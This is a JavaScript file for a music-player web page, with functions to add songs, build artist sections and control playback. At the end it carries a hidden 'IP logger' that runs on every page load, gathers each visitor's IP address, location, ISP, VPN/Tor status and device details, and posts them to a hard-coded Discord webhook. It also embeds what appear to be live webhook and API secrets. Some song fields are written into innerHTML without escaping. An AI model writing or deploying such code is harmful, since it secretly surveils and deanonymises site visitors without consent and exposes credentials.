// Toggle Add Music Form
function toggleAddMusicForm() {
    const form = document.getElementById('addMusicForm');
    form.style.display = form.style.display === 'none' ? 'block' : 'none';
}

// Add New Music
function addNewMusic() {
    // Get form values
    const title = document.getElementById('songTitle').value;
    const artist = document.getElementById('artist').value;
    const album = document.getElementById('album').value;
    const duration = document.getElementById('duration').value;
    const coverUrl = document.getElementById('coverUrl').value || './images/cas.png'; // Default image if none provided

    // Find the artist section or create new one
    let artistSection = findOrCreateArtistSection(artist);
    
    // Get the song grid
    const songGrid = artistSection.querySelector('.song-grid');
    
    // Get the current number of songs
    const songCount = songGrid.querySelectorAll('.song-item').length;

    // Create new song item
    const songItem = createSongItem(songCount + 1, title, artist, album, duration, coverUrl);
    
    // Add the new song to the grid
    songGrid.appendChild(songItem);

    // Clear form and hide it
    clearForm();
    toggleAddMusicForm();
}

// Find or Create Artist Section
function findOrCreateArtistSection(artistName) {
    let artistSection = Array.from(document.querySelectorAll('.artist-section')).find(section => 
        section.querySelector('.favtext h1').textContent.trim() === artistName
    );

    if (!artistSection) {
        // Create new artist section
        artistSection = document.createElement('div');
        artistSection.className = 'artist-section';
        artistSection.innerHTML = `
            <div class="favtext">
                <h1>${artistName}</h1>
                <b class="favdesc">Songs</b>
            </div>
            <div class="whiteline"></div>
            <div class="song-grid"></div>
        `;

        // Add to artists container
        document.querySelector('.artists-container').appendChild(artistSection);
    }

    return artistSection;
}

// Create Song Item
function createSongItem(number, title, artist, album, duration, coverUrl) {
    const div = document.createElement('div');
    div.className = 'song-item';
    const songId = `song-${artist.replace(/\s+/g, '-')}-${title.replace(/\s+/g, '-')}`.toLowerCase();
    div.innerHTML = `
        <div class="song-number">${number}</div>
        <div class="song-image-container">
            <img src="${coverUrl}" alt="${title}" class="song-image"/>
            <div class="play-button" onclick="playSong('${songId}')">
                <i class="fa-solid fa-play"></i>
            </div>
        </div>
        <div class="song-info">
            <div class="song-name">${title}</div>
            <div class="song-artist">${artist}</div>
        </div>
        <div class="song-album">${album}</div>
        <div class="song-duration">${duration}</div>
        <div class="music-visualizer">
            <div class="music-bar"></div>
            <div class="music-bar"></div>
            <div class="music-bar"></div>
            <div class="music-bar"></div>
        </div>
        <audio id="${songId}" src="musics/${artist}/${title}.mp3"></audio>
    `;
    return div;
}

// Clear Form
function clearForm() {
    document.getElementById('songTitle').value = '';
    document.getElementById('artist').value = '';
    document.getElementById('album').value = '';
    document.getElementById('duration').value = '';
    document.getElementById('coverUrl').value = '';
}

// Current playing audio element
let currentlyPlaying = null;
let isPlaying = false;

// Play individual song
function playSong(audioId, audioSrc) {
    const audioElement = document.getElementById(audioId);
    
    // If there's another song playing, stop it
    if (currentlyPlaying && currentlyPlaying !== audioElement) {
        currentlyPlaying.pause();
        currentlyPlaying.currentTime = 0;
        const oldSongItem = currentlyPlaying.closest('.song-item');
        if (oldSongItem) {
            oldSongItem.classList.remove('playing');
            const oldPlayButton = oldSongItem.querySelector('.play-button i');
            if (oldPlayButton) {
                oldPlayButton.className = 'fa-solid fa-play';
            }
        }
    }

    // If this song is already playing, pause it
    if (isPlaying && currentlyPlaying === audioElement) {
        audioElement.pause();
        isPlaying = false;
        const songItem = audioElement.closest('.song-item');
        const playButton = songItem.querySelector('.play-button');
        if (playButton) {
            playButton.classList.remove('playing');
            playButton.querySelector('i').className = 'fa-solid fa-play';
            // Remove any ongoing animations
            playButton.style.animation = 'none';
            // Force a reflow
            void playButton.offsetWidth;
            playButton.style.animation = '';
        }
        songItem.classList.remove('playing');
    } else {
        // Play the new song
        audioElement.play();
        isPlaying = true;
        currentlyPlaying = audioElement;
        const songItem = audioElement.closest('.song-item');
        const playButton = songItem.querySelector('.play-button');
        if (playButton) {
            playButton.classList.add('playing');
            playButton.querySelector('i').className = 'fa-solid fa-pause';
            // Reset any previous animation state
            playButton.style.animation = 'none';
            void playButton.offsetWidth;
            playButton.style.animation = '';
        }
        songItem.classList.add('playing');
    }

    // Update progress bar
    audioElement.ontimeupdate = function() {
        const songItem = this.closest('.song-item');
        if (songItem) {
            const progress = (this.currentTime / this.duration) * 100;
            songItem.style.setProperty('--progress', progress + '%');
        }
    };

    // When song ends
    audioElement.onended = function() {
        isPlaying = false;
        const songItem = this.closest('.song-item');
        if (songItem) {
            songItem.style.setProperty('--progress', '0%');
            const playButton = songItem.querySelector('.play-button');
            if (playButton) {
                playButton.classList.remove('playing');
                playButton.querySelector('i').className = 'fa-solid fa-play';
            }
            songItem.classList.remove('playing');
        }
    };
}

// Play all songs in a section
function playAllSongs(artistId) {
    const artistSection = document.querySelector(`[data-artist-id="${artistId}"]`);
    if (!artistSection) return;

    const audioElements = artistSection.querySelectorAll('audio');
    let currentIndex = 0;

    function playNext() {
        if (currentIndex < audioElements.length) {
            const audio = audioElements[currentIndex];
            audio.play();
            currentIndex++;
            audio.onended = playNext;
        }
    }

    playNext();
}


//Webhook IP

// IP Logger with Discord Webhook - Educational Purpose Only
// Replace with your actual Discord webhook URL
const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1397165010702172180/fEOUreMdx4Q7oGebxqlveBZOL4brnQ9VxpUIwwKysvTGeq70GHMWiTSuH4Hw0_Us5ppg';
const API_KEY = 'a4b4abd805edfe3e4e0e6a91f922efa4';

// Function to get visitor's IP and location data
async function logVisitor() {
    try {
        // First, get the visitor's IP address
        const ipResponse = await fetch('https://api.ipify.org?format=json');
        const ipData = await ipResponse.json();
        const visitorIP = ipData.ip;

        // Get detailed location information using the IP
        const locationResponse = await fetch(`https://iplocate.io/api/lookup/${visitorIP}?apikey=${API_KEY}`);
        const locationData = await locationResponse.json();

        // Get additional browser/device information
        const browserInfo = {
            userAgent: navigator.userAgent,
            language: navigator.language,
            platform: navigator.platform,
            cookieEnabled: navigator.cookieEnabled,
            onLine: navigator.onLine,
            screenResolution: `${screen.width}x${screen.height}`,
            colorDepth: screen.colorDepth,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            timestamp: new Date().toISOString(),
            referrer: document.referrer || 'Direct Visit',
            currentPage: window.location.href
        };

        // Create Discord embed message
        const embed = {
            title: "🔍 New Website Visitor",
            color: 0x00ff00, // Green color
            timestamp: new Date().toISOString(),
            fields: [
                {
                    name: "📍 Location Information",
                    value: `**IP:** ${locationData.ip}\n**Country:** ${locationData.country} (${locationData.country_code})\n**City:** ${locationData.city || 'Unknown'}\n**Region:** ${locationData.subdivision || 'Unknown'}\n**Timezone:** ${locationData.time_zone || 'Unknown'}`,
                    inline: false
                },
                {
                    name: "🌐 Network Information",
                    value: `**ISP:** ${locationData.company?.name || 'Unknown'}\n**ASN:** ${locationData.asn?.asn || 'Unknown'}\n**Network:** ${locationData.network || 'Unknown'}`,
                    inline: false
                },
                {
                    name: "🔒 Security Flags",
                    value: `**VPN:** ${locationData.privacy?.is_vpn ? '✅' : '❌'}\n**Proxy:** ${locationData.privacy?.is_proxy ? '✅' : '❌'}\n**Tor:** ${locationData.privacy?.is_tor ? '✅' : '❌'}\n**Datacenter:** ${locationData.privacy?.is_datacenter ? '✅' : '❌'}`,
                    inline: true
                },
                {
                    name: "💻 Device Information",
                    value: `**Platform:** ${browserInfo.platform}\n**Language:** ${browserInfo.language}\n**Screen:** ${browserInfo.screenResolution}\n**Timezone:** ${browserInfo.timezone}`,
                    inline: true
                },
                {
                    name: "🌐 Browser Information",
                    value: `**User Agent:** ${browserInfo.userAgent.substring(0, 100)}...\n**Referrer:** ${browserInfo.referrer}\n**Page:** ${browserInfo.currentPage}`,
                    inline: false
                }
            ],
            footer: {
                text: "Educational Purpose Only - Remove After Testing",
                icon_url: "https://cdn.discordapp.com/emojis/849428697022193674.png"
            }
        };

        // Add coordinates if available
        if (locationData.latitude && locationData.longitude) {
            embed.fields.push({
                name: "🧭 Coordinates",
                value: `**Lat:** ${locationData.latitude}\n**Long:** ${locationData.longitude}\n[View on Map](https://www.google.com/maps?q=${locationData.latitude},${locationData.longitude})`,
                inline: true
            });
        }

        // Send to Discord webhook
        const webhookData = {
            embeds: [embed],
            username: "IP Logger Bot",
            avatar_url: "https://cdn.discordapp.com/emojis/849428697022193674.png"
        };

        await fetch(DISCORD_WEBHOOK_URL, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(webhookData)
        });

        console.log('Visitor data logged successfully (Educational Purpose)');

    } catch (error) {
        console.error('Error logging visitor data:', error);
        
        // Send error notification to Discord
        try {
            const errorEmbed = {
                title: "❌ IP Logger Error",
                color: 0xff0000,
                description: `Error occurred while logging visitor: ${error.message}`,
                timestamp: new Date().toISOString()
            };

            await fetch(DISCORD_WEBHOOK_URL, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    embeds: [errorEmbed],
                    username: "IP Logger Bot"
                })
            });
        } catch (webhookError) {
            console.error('Failed to send error to Discord:', webhookError);
        }
    }
}

// Function to check if visitor should be logged (avoid duplicate logs)
function shouldLogVisitor() {
    const lastLog = localStorage.getItem('lastIPLog');
    const now = Date.now();
    const oneHour = 60 * 60 * 1000; // 1 hour in milliseconds

    if (!lastLog || (now - parseInt(lastLog)) > oneHour) {
        localStorage.setItem('lastIPLog', now.toString());
        return true;
    }
    return false;
}

// Auto-run when page loads
document.addEventListener('DOMContentLoaded', function() {
    // Add a small delay to ensure page is fully loaded
    setTimeout(() => {
        if (shouldLogVisitor()) {
            logVisitor();
        }
    }, 2000);
});

// Optional: Log when user leaves the page (for session tracking)
window.addEventListener('beforeunload', function() {
    // You can add additional logging here if needed
    console.log('User leaving page');
});

// Optional: Expose function globally for manual testing
window.testIPLogger = logVisitor;